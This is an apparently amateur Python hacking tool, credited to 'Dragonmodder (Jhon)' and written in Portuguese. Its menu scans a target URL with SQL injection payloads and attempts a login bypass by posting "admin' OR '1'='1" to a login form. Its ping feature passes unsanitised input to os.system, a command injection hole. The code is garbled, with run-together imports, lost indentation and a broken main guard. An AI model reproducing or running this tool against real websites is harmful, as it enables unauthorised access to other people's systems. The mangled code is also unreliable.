import os import time import requests from colorama import Fore, Style, init

Inicializa cores no Windows e sistemas compatíveis

init(autoreset=True)

def banner(): os.system("cls" if os.name == "nt" else "clear") print(Fore.RED + """ ██████╗ ██████╗ ██╗   ██╗███████╗███████╗ █████╗ ███████╗ ██╔══██╗██╔══██╗██║   ██║██╔════╝██╔════╝██╔══██╗██╔════╝ ██████╔╝██████╔╝██║   ██║███████╗███████╗███████║███████╗ ██╔═══╝ ██╔═══╝ ██║   ██║╚════██║╚════██║██╔══██║╚════██║ ██║     ██║     ╚██████╔╝███████║███████║██║  ██║███████║ ╚═╝     ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝ """ + Style.RESET_ALL) print(Fore.YELLOW + "By Dragonmodder (Jhon)\n")

def menu(): print(Fore.CYAN + "[1] Scanner de Injeção SQL") print(Fore.CYAN + "[2] Extrair Tabelas e Colunas") print(Fore.CYAN + "[3] Bypass de Login") print(Fore.CYAN + "[4] Verificar Conexão com o Site") print(Fore.CYAN + "[5] Sair\n")

def scan_sql(): url = input(Fore.GREEN + "\nDigite a URL alvo: ") payloads = ["' OR '1'='1", "' OR '1'='1' --", "' UNION SELECT 1,2,3 --"] print(Fore.MAGENTA + f"Testando {url} para SQL Injection...\n")

for payload in payloads:
    test_url = url + payload
    try:
        response = requests.get(test_url, timeout=5)
        if "sql" in response.text.lower() or "error" in response.text.lower():
            print(Fore.RED + f"[VULNERÁVEL] {test_url}")
        else:
            print(Fore.GREEN + f"[SEGURO] {test_url}")
    except requests.exceptions.RequestException:
        print(Fore.YELLOW + f"[ERRO] Não foi possível acessar {test_url}")
print(Fore.YELLOW + "\nScan finalizado!\n")

def bypass_login(): url = input(Fore.GREEN + "\nDigite a URL de login: ") usuario = "admin' OR '1'='1" senha = "senha_invalida" data = {"username": usuario, "password": senha}

try:
    response = requests.post(url, data=data, timeout=5)
    if response.status_code == 200 and ("dashboard" in response.text.lower() or "welcome" in response.text.lower()):
        print(Fore.RED + "[SUCESSO] Login bypassado!")
    else:
        print(Fore.GREEN + "[FALHA] O bypass não funcionou.")
except requests.exceptions.RequestException:
    print(Fore.YELLOW + "[ERRO] Falha ao conectar ao site.")

def check_connection(): url = input(Fore.GREEN + "\nDigite a URL alvo (sem http/https): ") os.system(f"ping {'-n' if os.name == 'nt' else '-c'} 4 {url}")

def main(): while True: banner() menu() opcao = input(Fore.YELLOW + "Escolha uma opção: ")

if opcao == '1':
        scan_sql()
    elif opcao == '2':
        print(Fore.RED + "[!] Função ainda não implementada!\n")
    elif opcao == '3':
        bypass_login()
    elif opcao == '4':
        check_connection()
    elif opcao == '5':
        print(Fore.RED + "Saindo...")
        break
    else:
        print(Fore.RED + "Opção inválida!\n")
    input(Fore.YELLOW + "Pressione Enter para continuar...")

if name == "main": main()

